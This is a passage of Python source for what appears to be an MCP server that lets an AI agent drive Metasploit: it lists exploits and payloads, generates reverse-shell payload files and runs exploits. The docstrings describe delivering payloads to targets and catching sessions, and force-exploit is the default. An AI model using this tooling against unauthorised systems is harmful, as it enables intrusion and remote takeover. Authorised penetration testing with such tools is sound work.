        return {"status": "error", "message": f"Metasploit RPC error: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error in describe_module for {full_module_path}")
        return {"status": "error", "message": f"Unexpected error: {e}"}


@annotated_tool
async def get_module_documentation(module: str) -> Dict[str, Any]:
    """
    Retrieve detailed usage documentation for a Metasploit module.

    This provides extended documentation including usage examples, scenarios,
    and detailed explanations that complement describe_module(). Documentation
    is sourced from the official Metasploit Framework documentation.

    RECOMMENDED WORKFLOW:
    1. Call describe_module() to understand available options and requirements
    2. Call get_module_documentation() for extended usage examples and scenarios
    3. Call run_exploit/run_auxiliary_module/run_post_module with correct options

    Args:
        module: Full or partial module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue'
                    or 'windows/smb/ms17_010_eternalblue')

    Returns:
        Dict containing:
        - status: 'success', 'not_found', or 'not_available'
        - documentation: Markdown content with usage examples and scenarios (if found)
        - suggestions: Alternative module documentation paths if exact match not found
        - message: Informational or error message
    """
    logger.info(f"get_module_documentation called for '{module}'")

    # Check if documentation directory exists
    docs_path = pathlib.Path(MSF_DOCS_PATH)
    if not docs_path.exists():
        logger.warning(f"Metasploit documentation directory not found at {MSF_DOCS_PATH}")
        return {
            "status": "not_available",
            "message": f"Module documentation is not installed. "
            f"Documentation is available in the Docker container at {MSF_DOCS_PATH}. "
            f"Use describe_module() for live module information from Metasploit RPC instead.",
            "documentation": None,
        }

    # Normalize module path - handle various input formats
    # e.g., "exploit/windows/smb/ms17_010_eternalblue" -> "exploit/windows/smb/ms17_010_eternalblue"
    # e.g., "windows/smb/ms17_010_eternalblue" -> try to find it in any type folder
    normalized_name = module.strip().strip("/")

    # Check if type prefix is present
    type_prefixes = ["exploit", "auxiliary", "post", "payload", "encoder", "nop"]
    has_type_prefix = any(normalized_name.startswith(f"{prefix}/") for prefix in type_prefixes)

    # Build potential documentation file paths
    potential_paths = []
    if has_type_prefix:
        # Direct path with type prefix
        doc_file = docs_path / f"{normalized_name}.md"
        potential_paths.append(doc_file)
    else:
        # Try all type prefixes
        for prefix in type_prefixes:
            doc_file = docs_path / prefix / f"{normalized_name}.md"
            potential_paths.append(doc_file)

    # Try to find and read the documentation
    for doc_file in potential_paths:
        if doc_file.exists():
            try:
                content = doc_file.read_text(encoding="utf-8")
                logger.info(f"Found documentation at {doc_file}")
                return {
                    "status": "success",
                    "documentation": content,
                    "path": str(doc_file.relative_to(docs_path)),
                    "message": f"Documentation found for {module}",
                }
            except Exception as e:
                logger.error(f"Error reading documentation file {doc_file}: {e}")
                return {
                    "status": "error",
                    "message": f"Error reading documentation: {e}",
                    "documentation": None,
                }

    # Documentation not found - try to find similar documentation files
    logger.info(f"Documentation not found for {module}, searching for alternatives...")
    suggestions = await _find_similar_documentation_files(docs_path, normalized_name)

    suggestion_text = ""
    if suggestions:
        suggestion_text = "Similar documentation files found:\n  - " + "\n  - ".join(
            suggestions[:5]
        )

    return {
        "status": "not_found",
        "message": f"No documentation found for '{module}'. "
        f"Note: Not all modules have documentation. "
        f"Use describe_module() for live module information from Metasploit RPC.",
        "suggestions": suggestions[:5] if suggestions else [],
        "suggestion_text": suggestion_text,
        "documentation": None,
    }


async def _find_similar_documentation_files(
    docs_path: pathlib.Path, module_name: str, max_suggestions: int = 5
) -> List[str]:
    """
    Find similar documentation files based on module name keywords.

    Args:
        docs_path: Path to the documentation directory
        module_name: The module name to search for
        max_suggestions: Maximum number of suggestions to return

    Returns:
        List of similar documentation file paths (relative to docs_path)
    """
    try:
        # Extract search terms from the module name
        parts = module_name.replace("_", "/").replace("-", "/").split("/")
        # Filter out common/generic terms and keep meaningful ones
        generic_terms = {
            "exploit",
            "payload",
            "auxiliary",
            "post",
            "scanner",
            "admin",
            "multi",
            "generic",
            "cmd",
            "x86",
            "x64",
            "linux",
            "windows",
            "unix",
            "osx",
            "freebsd",
            "solaris",
            "reverse",
            "bind",
            "staged",
            "stageless",
            "http",
            "https",
            "tcp",
            "udp",
            "modules",
        }
        search_terms = [p.lower() for p in parts if len(p) > 2 and p.lower() not in generic_terms]

        if not search_terms:
            # Fall back to the last part of the path
            search_terms = [parts[-1].lower()] if parts else []

        if not search_terms:
            return []

        # Find all markdown files in the docs directory
        md_files = []
        for md_file in docs_path.rglob("*.md"):
            rel_path = str(md_file.relative_to(docs_path))
            md_files.append(rel_path)

        # Score files by how many search terms they match
        scored_files = []
        for file_path in md_files:
            file_lower = file_path.lower()
            # Count matching terms
            matches = sum(1 for term in search_terms if term in file_lower)
            if matches > 0:
                scored_files.append((matches, file_path))

        # Sort by score (descending) and return top suggestions
        scored_files.sort(key=lambda x: (-x[0], x[1]))
        return [f for _, f in scored_files[:max_suggestions]]

    except Exception as e:
        logger.error(f"Error finding similar documentation files: {e}")
        return []


@annotated_tool
async def list_exploits(search: str = "", ctx: Optional[Context] = None) -> List[str]:
    """
    List available Metasploit exploits, optionally filtered by search term.

    Args:
        search: Optional term to filter exploits (case-insensitive).
        ctx: MCP Context for progress reporting (optional, injected by FastMCP).

    Returns:
        List of exploit names matching the term (max 200), or top 100 if no term.
    """
    client = get_msf_client()
    logger.info(f"Listing exploits (search term: '{search or 'None'}')")

    # Report initial progress if ctx available
    if ctx:
        await ctx.report_progress(
            progress=0, total=100, message="Listing exploits from Metasploit..."
        )

    # Use keep-alive for potentially slow RPC calls
    keepalive = get_keepalive_manager(
        ctx, operation_name="List exploits", initial_progress=5, max_progress=90
    )

    try:
        await keepalive.start()

        # Add timeout to prevent hanging on slow/unresponsive MSF server
        logger.debug(f"Calling client.modules.exploits with {RPC_CALL_TIMEOUT}s timeout...")
        exploits = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.modules.exploits), timeout=RPC_CALL_TIMEOUT
        )
        logger.debug(f"Retrieved {len(exploits)} total exploits from MSF.")
        if search:
            term_lower = search.lower()
            filtered_exploits = [e for e in exploits if term_lower in e.lower()]
            count = len(filtered_exploits)
            limit = 200
            logger.info(f"Found {count} exploits matching '{search}'. Returning max {limit}.")

            # Report completion if ctx available
            if ctx:
                await ctx.report_progress(
                    progress=100, total=100, message=f"Found {min(count, limit)} exploits"
                )

            return filtered_exploits[:limit]
        else:
            limit = 100
            logger.info(f"No search term provided, returning first {limit} exploits.")

            # Report completion if ctx available
            if ctx:
                await ctx.report_progress(
                    progress=100, total=100, message=f"Returning {limit} exploits"
                )

            return exploits[:limit]
    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing exploits from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return [f"Error: {error_msg}"]
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing exploits: {e}")
        return [f"Error: Metasploit RPC error: {e}"]
    except Exception as e:
        logger.exception("Unexpected error listing exploits.")
        return [f"Error: Unexpected error listing exploits: {e}"]
    finally:
        await keepalive.stop(send_completion=False)


@annotated_tool
async def list_payloads(
    platform: str = "",
    arch: str = "",
    compatible_with: str = "",
    search: str = "",
    include_fetch_payloads: bool = False,
    stage_hint: bool = True,
    ctx: Optional[Context] = None,
) -> List[str]:
    """
    List available Metasploit payloads, optionally filtered by platform, architecture, exploit module compatibility, and/or search term.

    IMPORTANT: For best results, use compatible_with parameter to get ONLY compatible payloads for a specific exploit.
    Using platform/search alone returns ALL payloads, which may include incompatible architectures (x86 vs x64).

    Args:
        platform: Optional platform filter (e.g., 'windows', 'linux', 'python', 'php').
                 Returns all payloads for that platform regardless of compatibility.
        arch: Optional architecture filter (e.g., 'x86', 'x64', 'cmd', 'meterpreter').
             Filters by architecture, but doesn't guarantee exploit compatibility.
        compatible_with: Optional exploit module name to list ONLY compatible payloads (e.g., 'windows/smb/ms17_010_eternalblue').
                       RECOMMENDED: Use this to get payloads guaranteed to work with the exploit.
                       Returns only payloads with correct architecture and compatibility for the target.
        search: Optional search term to filter payloads by name (e.g., 'meterpreter', 'reverse_tcp').
                    Supports partial matches and wildcards (*). Case-insensitive.
                    Returns matching payloads regardless of compatibility.
        include_fetch_payloads: If True, includes Fetch Payloads (cmd/*) in results. These require run_as_job=False to use.
                               Default is False as they need console execution.
        stage_hint: If True, append [staged]/[stageless] hints when detectable by naming pattern.
        ctx: MCP Context for progress reporting (optional, injected by FastMCP).

    Returns:
        List of payload names matching filters (max 100), prefixed with 'payload/' to match msfconsole format.
        Example: 'payload/linux/x64/meterpreter/reverse_tcp'

        Note: Fetch Payloads (payload/cmd/*) are excluded by default. Set include_fetch_payloads=True to see them.
              Fetch Payloads use command stagers (CURL, TFTP, CERTUTIL) and require console execution (run_as_job=False).
              You can use payloads with or without the 'payload/' prefix in run_exploit() - it will be normalized automatically.
    """
    client = get_msf_client()
    logger.info(
        f"Listing payloads (platform: '{platform or 'Any'}', arch: '{arch or 'Any'}', exploit: '{compatible_with or 'Any'}', search: '{search or 'Any'}')"
    )

    # Report initial progress if ctx available
    if ctx:
        await ctx.report_progress(
            progress=0, total=100, message="Listing payloads from Metasploit..."
        )

    # Use keep-alive for potentially slow RPC calls
    keepalive = get_keepalive_manager(
        ctx, operation_name="List payloads", initial_progress=5, max_progress=90
    )

    try:
        await keepalive.start()

        # If compatible_with is provided, get compatible payloads for that module
        if compatible_with:
            logger.info(f"Getting compatible payloads for exploit module: {compatible_with}")
            try:
                # Get the module object
                module_obj = await _get_module_object("exploit", compatible_with)

                # Get compatible payloads using MSF RPC API
                # The module.compatible_payloads method returns payloads compatible with the exploit
                logger.debug(
                    f"Calling module.payloads for {compatible_with} with {RPC_CALL_TIMEOUT}s timeout..."
                )
                compatible = await asyncio.wait_for(
                    asyncio.to_thread(lambda: module_obj.payloads), timeout=RPC_CALL_TIMEOUT
                )
                logger.debug(
                    f"Retrieved {len(compatible)} compatible payloads for {compatible_with}."
                )

                # compatible_payloads returns a list of payload names
                filtered = compatible

            except (ValueError, InvalidModuleError) as ve:
                # Module not found
                logger.warning(f"Exploit module '{compatible_with}' not found: {ve}")
                return [
                    f"Error: Exploit module '{compatible_with}' not found. Please verify the module name using list_exploits."
                ]
            except AttributeError as attr_err:
                logger.warning(
                    "Exploit module '%s' does not expose compatible payloads: %s",
                    compatible_with,
                    attr_err,
                )
                return [
                    (
                        f"Error: Exploit module '{compatible_with}' does not expose compatible payloads. "
                        "Use list_payloads without compatible_with to enumerate all payloads."
                    )
                ]
        else:
            # Add timeout to prevent hanging on slow/unresponsive MSF server
            logger.debug(f"Calling client.modules.payloads with {RPC_CALL_TIMEOUT}s timeout...")
            payloads = await asyncio.wait_for(
                asyncio.to_thread(lambda: client.modules.payloads), timeout=RPC_CALL_TIMEOUT
            )
            logger.debug(f"Retrieved {len(payloads)} total payloads from MSF.")
            filtered = payloads

        # Apply platform and arch filters if provided
        if platform:
            plat_lower = platform.lower()
            # Separate ARCH_CMD payloads (cmd stagers) - they work on any platform
            cmd_stagers = [p for p in filtered if p.lower().startswith("cmd/")]
            other_payloads = [p for p in filtered if not p.lower().startswith("cmd/")]

            # Apply platform filter to non-cmd payloads
            # Match platform at the start of the payload path segment or within common paths
            filtered_other = [
                p
                for p in other_payloads
                if p.lower().startswith(plat_lower + "/") or f"/{plat_lower}/" in p.lower()
            ]

            # For cmd stagers, check if they match the platform (e.g., cmd/unix/ matches platform='unix')
            filtered_cmd = [p for p in cmd_stagers if f"/{plat_lower}/" in p.lower()]

            # If no platform-matched cmd stagers, include all cmd stagers anyway (they're universal)
            if not filtered_cmd and cmd_stagers:
                # No cmd stagers matched platform, but include them anyway as they're universal
                filtered_cmd = cmd_stagers
                logger.debug(
                    f"Platform filter '{platform}': Including all {len(cmd_stagers)} ARCH_CMD stagers (universal)"
                )

            filtered = filtered_other + filtered_cmd
            logger.debug(
                f"Platform filter '{platform}': {len(filtered_other)} matching payloads + {len(filtered_cmd)} ARCH_CMD stagers = {len(filtered)} total"
            )

        if arch:
            arch_lower = arch.lower()

            # Non-architecture-specific payload types that should always be included
            # These work on any architecture (ARCH_CMD, ARCH_PHP, ARCH_PYTHON, etc.)
            non_arch_specific_prefixes = [
                "cmd/",  # ARCH_CMD - command stagers
                "php/",  # ARCH_PHP
                "python/",  # ARCH_PYTHON
                "java/",  # ARCH_JAVA
                "ruby/",  # ARCH_RUBY
                "dalvik/",  # ARCH_DALVIK
                "nodejs/",  # ARCH_NODEJS
                "firefox/",  # ARCH_FIREFOX
                "r/",  # ARCH_R
                "tty/",  # ARCH_TTY
            ]

            # Helper function to check if payload is non-architecture-specific
            # Handles both "cmd/unix/reverse_bash" and "payload/cmd/unix/reverse_bash" formats
            def is_non_arch_specific(payload_path: str) -> bool:
                path_lower = payload_path.lower()
                # Remove "payload/" prefix if present for checking
                check_path = path_lower[8:] if path_lower.startswith("payload/") else path_lower
                return any(check_path.startswith(prefix) for prefix in non_arch_specific_prefixes)

            # Separate non-architecture-specific payloads from architecture-specific ones
            non_arch_payloads = [p for p in filtered if is_non_arch_specific(p)]
            arch_specific_payloads = [p for p in filtered if not is_non_arch_specific(p)]

            # Apply arch filter strictly to architecture-specific payloads
            # Match architecture more flexibly (e.g., '/x64/', 'meterpreter')
            filtered_arch_specific = [
                p
                for p in arch_specific_payloads
                if f"/{arch_lower}/" in p.lower() or arch_lower in p.lower().split("/")
            ]

            # Always include non-architecture-specific payloads regardless of arch filter
            filtered = filtered_arch_specific + non_arch_payloads
            logger.debug(
                f"Arch filter '{arch}': {len(filtered_arch_specific)} arch-specific matching payloads + {len(non_arch_payloads)} non-arch-specific payloads = {len(filtered)} total"
            )

        # Apply search filter if provided
        if search:
            search_lower = search.lower()
            # Support wildcards by converting * to .* for regex matching
            if "*" in search_lower:
                pattern = re.compile(search_lower.replace("*", ".*"))
                filtered = [p for p in filtered if pattern.search(p.lower())]
            else:
                # Simple substring match
                filtered = [p for p in filtered if search_lower in p.lower()]

        payloads = filtered
        count = len(payloads)
        limit = 100
        logger.info(f"Found {count} payloads matching filters. Returning max {limit}.")

        result = payloads[:limit]
        if stage_hint:
            hinted = []
            for payload_name in result:
                stage = _classify_payload_stage(payload_name)
                if stage == "staged":
                    hinted.append(f"{payload_name} [staged]")
                elif stage == "stageless":
                    hinted.append(f"{payload_name} [stageless]")
                else:
                    hinted.append(payload_name)
            result = hinted

        # Report completion if ctx available
        if ctx:
            await ctx.report_progress(
                progress=100, total=100, message=f"Found {len(result)} payloads"
            )

        return result
    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing payloads from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return [f"Error: {error_msg}"]
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing payloads: {e}")
        return [f"Error: Metasploit RPC error: {e}"]
    except Exception as e:
        logger.exception("Unexpected error listing payloads.")
        return [f"Error: Unexpected error listing payloads: {e}"]
    finally:
        await keepalive.stop(send_completion=False)


@annotated_tool
@dangerous_tool
async def generate_payload(
    payload: str,
    format: str,
    options: Union[
        Dict[str, Any], str
    ],  # Required: e.g., {"LHOST": "1.2.3.4", "LPORT": 4444} or "LHOST=1.2.3.4,LPORT=4444"
    encoder: Optional[str] = None,
    iterations: int = 0,
    badchars: str = "",
    nops: int = 0,
    template: Optional[str] = None,
    keep_template: bool = False,
    force_encode: bool = False,
    output: Optional[str] = None,
    reverselistenerbindaddress: Optional[str] = None,
    reverselistenerbindport: Optional[int] = None,
    ctx: Optional[Context] = None,
) -> Dict[str, Any]:
    """
    Generate a Metasploit payload using the RPC API (payload.generate).
    Saves the generated payload to a file on the server if successful.

    IMPORTANT - LISTENER REQUIREMENT:
    After generating a payload, you MUST use start_listener() to set up a handler that will
    catch connections from the generated payload when it's executed on a target system.

    WORKFLOW:
    1. Call generate_payload() to create the payload file (e.g., .exe, .elf, .py)
    2. Call start_listener() with matching payload, LHOST, and LPORT
    3. Distribute/execute the generated payload file on the target
    4. The target will connect back to your listener and establish a session

    EXAMPLE - CORRECT USAGE:
        # Step 1: Generate payload
        result = await generate_payload(
            payload='windows/meterpreter/reverse_tcp',
            format='exe',
            options={'LHOST': '10.0.0.1', 'LPORT': 4444}
        )
        # Step 2: Start matching listener
        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)
        # Step 3: Deliver and execute the payload file on target (outside Metasploit)

    NOTE: This is different from run_exploit() which automatically handles listener creation
    when running exploit modules. Use generate_payload() + start_listener() when you need
    standalone payload files for manual delivery.

    Args:
        payload: Type of payload (e.g., windows/meterpreter/reverse_tcp).
        format: Output format (raw, exe, python, etc.).
        options: Dictionary of required payload options (e.g., {"LHOST": "1.2.3.4", "LPORT": 4444})
                or string format "LHOST=1.2.3.4,LPORT=4444". Prefer dict format.
        encoder: Optional encoder to use.
        iterations: Optional number of encoding iterations.
        badchars: Optional string of bad characters to avoid (e.g., '\\x00\\x0a\\x0d').
        nops: Optional size of NOP sled.
        template: Optional path to an executable template.
        keep_template: Keep the template working (requires template).
        force_encode: Force encoding even if not needed by bad chars.
        output: Optional desired filename (without path). If None, a default name is generated.
        reverselistenerbindaddress: Optional bind address for reverse payloads (defaults to 0.0.0.0).
                                      Use this when LHOST differs from the interface to bind to (e.g., NAT/firewall).
        reverselistenerbindport: Optional bind port for reverse payloads (defaults to LPORT).
                                   Use this when LPORT differs from the port to bind to (e.g., port forwarding).

    Returns:
        Dictionary containing status, message, payload size/info, and server-side save path.
    """
    client = get_msf_client()
    logger.info(f"Generating payload '{payload}' (Format: {format}) via RPC. Options: {options}")

    # Report initial progress if ctx available
    if ctx:
        await ctx.report_progress(progress=0, total=100, message=f"Generating payload: {payload}")

    # Parse options gracefully
    try:
        parsed_options = _parse_options_gracefully(options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid options format: {e}"}

    if not parsed_options:
        return {
            "status": "error",
            "message": "Payload 'options' dictionary (e.g., LHOST, LPORT) is required.",
        }

    # Handle bind address and port options
    bind_address_to_validate = None
    if reverselistenerbindaddress is not None:
        bind_address_to_validate = reverselistenerbindaddress
        parsed_options["ReverseListenerBindAddress"] = reverselistenerbindaddress
    elif "LHOST" in parsed_options:
        # Default to 0.0.0.0 instead of using LHOST
        bind_address_to_validate = "0.0.0.0"
        parsed_options["ReverseListenerBindAddress"] = "0.0.0.0"

    # Validate bind address if one was set
    if bind_address_to_validate is not None:
        is_valid, error_msg = await validate_bind_address(bind_address_to_validate)
        if not is_valid:
            return {
                "status": "error",
                "message": f"Invalid ReverseListenerBindAddress: {error_msg}",
            }

    if reverselistenerbindport is not None:
        if not (1 <= reverselistenerbindport <= 65535):
            return {
                "status": "error",
                "message": "Invalid ReverseListenerBindPort. Must be between 1 and 65535.",
            }
        parsed_options["ReverseListenerBindPort"] = reverselistenerbindport

    # Check LPORT availability if it's a reverse payload (optional warning for payload generation)
    # This provides early feedback even though the actual bind happens when the payload runs/listener starts
    if "LPORT" in parsed_options:
        lport_value = parsed_options["LPORT"]
        try:
            lport_int = int(lport_value)
            # Determine the bind address and port for checking
            check_bind_address = parsed_options.get("ReverseListenerBindAddress", "0.0.0.0")
            check_bind_port = parsed_options.get("ReverseListenerBindPort", lport_int)

            # Check port availability (as a warning, not blocking)
            port_available, port_error = await check_port_available(
                check_bind_port, check_bind_address
            )
            if not port_available:
                logger.warning(
                    f"Port check during payload generation: {port_error}. "
                    f"This payload will need a listener on {check_bind_address}:{check_bind_port}"
                )
                # Note: Not returning error here since payload generation itself doesn't bind the port
                # The port will be needed when start_listener() or run_exploit() is called later
        except (ValueError, TypeError) as e:
            logger.warning(
                f"Could not validate LPORT value '{lport_value}' during payload generation: {e}"
            )

    # Use keep-alive for payload generation
    keepalive = get_keepalive_manager(
        ctx, operation_name=f"Generate payload {payload}", initial_progress=10, max_progress=90
    )

    try:
        await keepalive.start()

        # Get the payload module object
        payload_obj = await _get_module_object("payload", payload)

        # Set payload-specific required options (like LHOST/LPORT)
        await _set_module_options(payload_obj, parsed_options, module_type="payload")

        # Set payload generation options in payload.runoptions
        # as per the pymetasploit3 documentation
        logger.info("Setting payload generation options in payload.runoptions...")

        # Define a function to update an individual runoption
        async def update_runoption(key, value):
            if value is None:
                return
            await asyncio.to_thread(lambda k=key, v=value: payload_obj.runoptions.__setitem__(k, v))
            logger.debug(f"Set runoption {key}={value}")

        # Set generation options individually
        await update_runoption("Format", format)
        if encoder:
            await update_runoption("Encoder", encoder)
        if iterations:
            await update_runoption("Iterations", iterations)
        if badchars is not None:
            await update_runoption("BadChars", badchars)
        if nops:
            await update_runoption("NopSledSize", nops)
        if template:
            await update_runoption("Template", template)
        if keep_template:
            await update_runoption("KeepTemplateWorking", keep_template)
        if force_encode:
            await update_runoption("ForceEncode", force_encode)

        # Generate the payload bytes using payload.payload_generate()
        logger.info("Calling payload.payload_generate()...")
        raw_payload_bytes = await asyncio.to_thread(lambda: payload_obj.payload_generate())

        if not isinstance(raw_payload_bytes, bytes):
            error_msg = f"Payload generation failed. Expected bytes, got {type(raw_payload_bytes)}: {str(raw_payload_bytes)[:200]}"
            logger.error(error_msg)
            # Try to extract specific error from potential dictionary response
            if isinstance(raw_payload_bytes, dict) and raw_payload_bytes.get("error"):
                error_msg = raw_payload_bytes.get("error_message", str(raw_payload_bytes))
            return {"status": "error", "message": f"Payload generation failed: {error_msg}"}

        payload_size = len(raw_payload_bytes)
        logger.info(f"Payload generation successful. Size: {payload_size} bytes.")

        # --- Save Payload ---
        # Ensure directory exists
        try:
            os.makedirs(PAYLOAD_SAVE_DIR, exist_ok=True)
            logger.debug(f"Ensured payload directory exists: {PAYLOAD_SAVE_DIR}")
        except OSError as e:
            logger.error(f"Failed to create payload save directory {PAYLOAD_SAVE_DIR}: {e}")
            return {
                "status": "error",
                "message": f"Payload generated ({payload_size} bytes) but could not create save directory: {e}",
                "payload_size": payload_size,
                "format": format,
            }

        # Determine filename (with basic sanitization)
        final_filename = None
        if output:
            sanitized = re.sub(
                r"[^a-zA-Z0-9_.\-]", "_", os.path.basename(output)
            )  # Basic sanitize + basename
            if sanitized:
                final_filename = sanitized

        if not final_filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_payload = re.sub(r"[^a-zA-Z0-9_]", "_", payload)
            safe_format = re.sub(r"[^a-zA-Z0-9_]", "_", format)
            final_filename = f"payload_{safe_payload}_{timestamp}.{safe_format}"

        save_path = os.path.join(PAYLOAD_SAVE_DIR, final_filename)

        # Write payload to file
        try:
            with open(save_path, "wb") as f:
                f.write(raw_payload_bytes)
            logger.info(f"Payload saved to {save_path}")

            # Report completion if ctx available
            if ctx:
                await ctx.report_progress(
                    progress=100, total=100, message=f"Payload generated: {payload_size} bytes"
                )

            return {
                "status": "success",
                "message": f"Payload '{payload}' generated successfully and saved.",
                "payload_size": payload_size,
                "format": format,
                "server_save_path": save_path,
            }
        except IOError as e:
            logger.error(f"Failed to write payload to {save_path}: {e}")
            return {
                "status": "error",
                "message": f"Payload generated but failed to save to file: {e}",
                "payload_size": payload_size,
                "format": format,
            }

    except InvalidModuleError as e:
        # Clean warning for invalid payload module (not a bug, just wrong module name)
        logger.warning(f"Payload type '{payload}' not found: {e}")
        return {
            "status": "error",
            "message": f"Invalid payload type: {payload}. Verify the payload name is correct and available in your Metasploit installation.",
        }
    except (
        ValueError,
        MsfRpcError,
    ) as e:  # Catches errors from _get_module_object, _set_module_options
        error_str = str(e).lower()
        logger.error(f"Error generating payload {payload}: {e}")
        if "invalid payload type" in error_str or "unknown module" in error_str:
            return {"status": "error", "message": f"Invalid payload type: {payload}"}
        elif "missing required option" in error_str or "invalid option" in error_str:
            missing = (
                getattr(payload_obj, "missing_required", []) if "payload_obj" in locals() else []
            )
            return {
                "status": "error",
                "message": f"Missing/invalid options for payload {payload}: {e}",
                "missing_required": missing,
            }
        return {"status": "error", "message": f"Error generating payload: {e}"}
    except AttributeError as e:  # Specifically catch if payload_generate is missing
        logger.exception(f"AttributeError during payload generation for '{payload}': {e}")
        if "object has no attribute 'payload_generate'" in str(e):
            return {
                "status": "error",
                "message": f"The pymetasploit3 payload module doesn't have the payload_generate method. Please check library version/compatibility.",
            }
        return {"status": "error", "message": f"An attribute error occurred: {e}"}
    except KeyError as e:
        # KeyError from pymetasploit3's payload_generate() when Metasploit RPC returns
        # an error response without a 'payload' key (e.g., missing options, invalid format)
        error_str = str(e)
        logger.error(
            f"KeyError during payload generation for '{payload}' (format: {format}): {e}. "
            f"This typically indicates the Metasploit RPC server rejected the payload generation request. "
            f"Options provided: {parsed_options}",
            exc_info=True,
        )

        # Provide helpful guidance based on common issues
        guidance_messages = []
        if "payload" in error_str.lower():
            guidance_messages.append(
                f"The Metasploit RPC server did not return generated payload data. "
                f"Common causes: (1) Missing required options (check LHOST, LPORT for reverse payloads), "
                f"(2) Incompatible format '{format}' for payload '{payload}' "
                f"(try 'raw', 'elf', 'exe', 'war', 'jar', or 'jsp' depending on payload type), "
                f"(3) The payload module may have specific requirements not met."
            )

        # Check if payload module has info about required options
        missing_required = []
        try:
            if "payload_obj" in locals() and hasattr(payload_obj, "missing_required"):
                missing_required = payload_obj.missing_required
                if missing_required:
                    guidance_messages.append(f"Missing required options: {missing_required}")
        except Exception:
            pass  # Don't fail on introspection

        return {
            "status": "error",
            "message": (
                f"Payload generation failed for '{payload}' with format '{format}'. "
                + " ".join(guidance_messages)
                if guidance_messages
                else f"Payload generation failed for '{payload}' with format '{format}'. "
                f"The Metasploit server did not return the expected payload data. "
                f"Verify that the payload type, format, and options are valid and compatible."
            ),
            "payload": payload,
            "format": format,
            "missing_required": missing_required if missing_required else None,
        }
    except Exception as e:
        logger.exception(f"Unexpected error during payload generation for '{payload}'.")
        return {
            "status": "error",
            "message": f"An unexpected server error occurred during payload generation: {e}",
        }
    finally:
        await keepalive.stop(send_completion=False)


@annotated_tool
@dangerous_tool
async def run_exploit(
    module: str,
    options: Union[Dict[str, Any], str],
    payload: Optional[str] = None,
    payload_options: Optional[Union[Dict[str, Any], str]] = None,
    run_as_job: bool = True,
    check_vulnerability: bool = False,  # New option
    force_exploit: bool = True,
    timeout_seconds: int = LONG_CONSOLE_READ_TIMEOUT,  # Used only if run_as_job=False (max: 120s)
    inactivity_timeout_seconds: int = SESSION_READ_INACTIVITY_TIMEOUT,
    ctx: Optional[Context] = None,
) -> Dict[str, Any]:
    """
    Run a Metasploit exploit module with specified options. Handles async (job)
    and sync (console) execution, and includes session polling for jobs.

    IMPORTANT - LISTENER HANDLING:
    This function AUTOMATICALLY sets up the necessary listener/handler when you provide
    a payload and payload_options. DO NOT call start_listener() separately for the
    same payload/port combination - this will cause port conflicts and failures.

    WHEN TO USE start_listener() vs run_exploit():
    - Use ONLY run_exploit() when: Running an exploit that needs a reverse shell/meterpreter
      connection back to you. The exploit will handle the listener automatically.
    - Use start_listener() ONLY when:
      * You need a standalone listener NOT tied to a specific exploit run
      * You're using manually generated payloads (from generate_payload) that need a handler
      * You need a persistent listener that survives multiple connection attempts
      * You're coordinating multi-stage attacks where the listener must exist before the exploit

    EXAMPLE - CORRECT USAGE (run_exploit handles listener):
        await run_exploit(
            module='exploit/multi/handler',
            options={},
            payload='windows/meterpreter/reverse_tcp',
            payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444}
        )
        # No need to call start_listener() - it's automatic!

    EXAMPLE - INCORRECT USAGE (duplicate listener):
        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)  # Creates listener on port 4444
        await run_exploit(..., payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444})  # FAILS - port already in use!

    Args:
        module: Name/path of the exploit module (e.g., 'unix/ftp/vsftpd_234_backdoor').
        options: Dictionary of exploit module options (e.g., {'RHOSTS': '192.168.1.1'})
                or string format "RHOSTS=192.168.1.1,RPORT=21". Prefer dict format.
        payload: Name of the payload (e.g., 'linux/x86/meterpreter/reverse_tcp').
                     When specified, this function AUTOMATICALLY creates the handler/listener.
        payload_options: Dictionary of payload options (e.g., {'LHOST': '...', 'LPORT': ...})
                        or string format "LHOST=1.2.3.4,LPORT=4444". Prefer dict format.
                        AUTOMATICALLY creates the listener on the specified LHOST/LPORT.
        run_as_job: If False, run sync via console. If True, run async via RPC.
        check_vulnerability: If True, run module's 'check' action first (if available).
        force_exploit: If True (default), automatically sets ForceExploit=true and
                       AutoCheck=false unless already provided in options *and* those
                       options are supported by the selected module. This avoids
                       AutoCheck aborting exploitation when check results are inconclusive.
                       Set False to preserve module defaults.
        timeout_seconds: Max time for synchronous run via console (max: 120s, values above are capped).
        inactivity_timeout_seconds: Max inactivity time for synchronous console output reads
                                    (max: 120s, values above are capped).

    Returns:
        Dictionary with execution results (job_id, session_id, output) or error details.
    """
    # Cap timeout_seconds at MAX_TOOL_TIMEOUT_SECONDS (120s)
    if timeout_seconds > MAX_TOOL_TIMEOUT_SECONDS:
        logger.warning(
            f"timeout_seconds {timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, capping to {MAX_TOOL_TIMEOUT_SECONDS}s"
        )
        timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS
    if inactivity_timeout_seconds > MAX_TOOL_TIMEOUT_SECONDS:
        logger.warning(
            f"inactivity_timeout_seconds {inactivity_timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, "
            f"capping to {MAX_TOOL_TIMEOUT_SECONDS}s"
        )
        inactivity_timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS

    logger.info(
        f"Request to run exploit '{module}'. Job: {run_as_job}, Check: {check_vulnerability}, Payload: {payload}"
    )

    logger.info(f"Module {module} options: {options}")
    logger.info(f"Payload {payload} options: {payload_options}")

    exploit_module = None
    # Validate module exists before proceeding
    try:
        exploit_module = await _get_module_object("exploit", module)
        logger.debug(f"Module '{module}' validated successfully")
    except InvalidModuleError as e:
        logger.warning(f"Exploit module '{module}' not found: {e}")
